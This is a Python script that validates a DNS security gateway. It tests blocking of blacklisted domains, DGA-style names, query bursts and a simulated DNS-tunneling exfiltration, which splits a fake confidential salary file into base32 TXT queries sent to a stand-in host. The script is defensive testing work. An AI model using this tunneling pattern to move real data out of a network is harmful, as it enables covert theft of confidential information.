"""Validation scenarios from Section 4.8 of the report.

Run this on the test device (or the gateway itself) to exercise the gateway:

  legit      ordinary domains resolve, and the latency is measured
  blacklist  known-bad domains (and their subdomains) are blocked
  dga        random-looking, algorithmically generated names are flagged
  tunnel     base32-encoded "exfiltration" queries over TXT are blocked
  burst      a scripted burst of queries for one name trips the rate check

A query counts as blocked when the gateway answers REFUSED or with a
0.0.0.0 / :: sinkhole address (the "refused" and "sinkhole" block modes).

Usage:
  python scripts/simulate_traffic.py --server 192.168.1.50 --port 53
  python scripts/simulate_traffic.py --scenario tunnel --compare 1.1.1.1
"""

import argparse
import base64
import os
import random
import statistics
import string
import sys
import time

from dnslib import DNSRecord, QTYPE, RCODE

LEGIT = ["google.com", "wikipedia.org", "github.com", "microsoft.com", "amazon.in",
         "nmims.edu", "stackoverflow.com", "python.org", "cloudflare.com", "youtube.com",
         "linkedin.com", "bbc.co.uk", "apple.com", "netflix.com", "reddit.com"]

BLACKLISTED = ["malware-test.example", "phishing-test.example", "c2-callback.example",
               "beacon.c2-callback.example", "a.b.malware-test.example", "doubleclick.net",
               "stats.g.doubleclick.net", "malware.wicar.org"]

SECRET = ("CONFIDENTIAL employee_db.csv: id,name,salary\n"
          "1,Alice,120000\n2,Bob,98000\n3,Carol,143000\n4,Dave,87000\n") * 3


class Result:
    def __init__(self, name, rcode, answers, latency_ms, error=None):
        self.name, self.rcode, self.answers, self.latency_ms, self.error = name, rcode, answers, latency_ms, error

    @property
    def blocked(self):
        if self.rcode == "REFUSED":
            return True
        return bool(self.answers) and all(a in ("0.0.0.0", "::") for a in self.answers)

    @property
    def resolved(self):
        return self.rcode == "NOERROR" and bool(self.answers) and not self.blocked


def query(server, port, name, qtype="A", timeout=4.0):
    q = DNSRecord.question(name, qtype)
    start = time.perf_counter()
    try:
        reply = DNSRecord.parse(q.send(server, port, timeout=timeout))
    except Exception as exc:
        return Result(name, "TIMEOUT", [], (time.perf_counter() - start) * 1000, str(exc))
    latency = (time.perf_counter() - start) * 1000
    answers = [str(rr.rdata) for rr in reply.rr]
    return Result(name, RCODE.get(reply.header.rcode), answers, latency)


def header(title):
    print(f"\n=== {title} " + "=" * max(0, 66 - len(title)))


def row(r, extra=""):
    status = "BLOCKED" if r.blocked else ("OK" if r.resolved else r.rcode)
    name = r.name if len(r.name) <= 52 else r.name[:49] + "..."
    print(f"  {status:<8} {r.latency_ms:7.1f} ms  {name} {extra}")


# --------------------------------------------------------------------------- #
def scenario_legit(server, port, compare=None):
    header("1. Legitimate domain resolution")
    results = [query(server, port, d) for d in LEGIT]
    for r in results:
        row(r, r.answers[0] if r.answers else "")
    ok = sum(r.resolved for r in results)
    lat = [r.latency_ms for r in results if r.resolved]
    print(f"  -> {ok}/{len(results)} resolved; median latency {statistics.median(lat) if lat else 0:.1f} ms")
    if compare:
        direct = [query(compare, 53, d).latency_ms for d in LEGIT]
        print(f"  -> direct to {compare}: median {statistics.median(direct):.1f} ms "
              f"(gateway overhead approx {statistics.median(lat) - statistics.median(direct):+.1f} ms)")
    # A domain or two may legitimately fail (e.g. no internet for one TLD); require 80%.
    return ok >= 0.8 * len(results), f"{ok}/{len(results)} legitimate domains resolved"


def scenario_blacklist(server, port):
    header("2. Blacklisted domain resolution")
    results = [query(server, port, d) for d in BLACKLISTED]
    for r in results:
        row(r)
    blocked = sum(r.blocked for r in results)
    print(f"  -> {blocked}/{len(results)} blocked ({blocked / len(results):.0%})")
    return blocked == len(results), f"{blocked}/{len(results)} blacklisted domains blocked"


def scenario_dga(server, port, count=10):
    header("3. Simulated DGA (algorithmically generated) domains")
    rng = random.Random(1337)
    names = []
    for _ in range(count):
        length = rng.randint(13, 20)
        sld = "".join(rng.choice(string.ascii_lowercase + string.digits) for _ in range(length))
        names.append(f"{sld}.{rng.choice(['com', 'net', 'info', 'xyz', 'top'])}")
    results = [query(server, port, n) for n in names]
    for r in results:
        row(r)
    blocked = sum(r.blocked for r in results)
    print(f"  -> {blocked}/{len(results)} DGA-style domains blocked "
          f"(the rest are typically logged as 'suspicious' - check the dashboard)")
    # Naming heuristics are probabilistic, unlike blacklist matching; require a majority.
    return blocked >= 0.5 * len(results), f"{blocked}/{len(results)} DGA domains blocked"


def scenario_tunnel(server, port, parent="exfil-sim.example"):
    header("4. Simulated DNS tunneling (base32 data exfiltration over TXT)")
    payload = base64.b32encode(SECRET.encode()).decode().rstrip("=").lower()
    chunks = [payload[i:i + 56] for i in range(0, len(payload), 56)]
    results = []
    for seq, chunk in enumerate(chunks):
        name = f"{chunk}.{seq:03d}.{os.urandom(2).hex()}.{parent}"
        results.append(query(server, port, name, "TXT"))
    for r in results[:6]:
        row(r)
    if len(results) > 6:
        print(f"  ... {len(results) - 6} more")
    blocked = sum(r.blocked for r in results)
    print(f"  -> {blocked}/{len(results)} tunneling queries blocked ({blocked / len(results):.0%})")
    return blocked >= 0.9 * len(results), f"{blocked}/{len(results)} tunneling queries blocked"


def scenario_burst(server, port, name="example.com", count=60):
    header(f"5. Scripted query burst ({count} x {name} as fast as possible)")
    results = [query(server, port, name) for _ in range(count)]
    first_block = next((i for i, r in enumerate(results) if r.blocked), None)
    blocked = sum(r.blocked for r in results)
    print(f"  -> {blocked}/{count} blocked; rate limit tripped after query #{first_block + 1 if first_block is not None else '-'}")
    return blocked > 0, f"burst detected after {first_block + 1 if first_block is not None else 'never'} queries"


SCENARIOS = {"legit": scenario_legit, "blacklist": scenario_blacklist, "dga": scenario_dga,
             "tunnel": scenario_tunnel, "burst": scenario_burst}


def main(argv=None):
    p = argparse.ArgumentParser(description="Secure DNS Gateway validation scenarios")
    p.add_argument("--server", default="127.0.0.1", help="gateway IP address")
    p.add_argument("--port", type=int, default=53)
    p.add_argument("--scenario", default="all", choices=list(SCENARIOS) + ["all"])
    p.add_argument("--compare", help="upstream IP to compare latency against, e.g. 1.1.1.1")
    args = p.parse_args(argv)

    print(f"Testing Secure DNS Gateway at {args.server}:{args.port}")
    probe = query(args.server, args.port, "example.com", timeout=3)
    if probe.rcode == "TIMEOUT":
        print(f"!! no answer from {args.server}:{args.port} - is the gateway running?")
        return 2

    names = list(SCENARIOS) if args.scenario == "all" else [args.scenario]
    summary = []
    for name in names:
        fn = SCENARIOS[name]
        passed, detail = fn(args.server, args.port, args.compare) if name == "legit" else fn(args.server, args.port)
        summary.append((name, passed, detail))

    header("Summary")
    for name, passed, detail in summary:
        print(f"  [{'PASS' if passed else 'FAIL'}] {name:<10} {detail}")
    print("\nOpen the dashboard to see these events appear in near real time.")
    return 0 if all(p for _, p, _ in summary) else 1


if __name__ == "__main__":
    sys.exit(main())
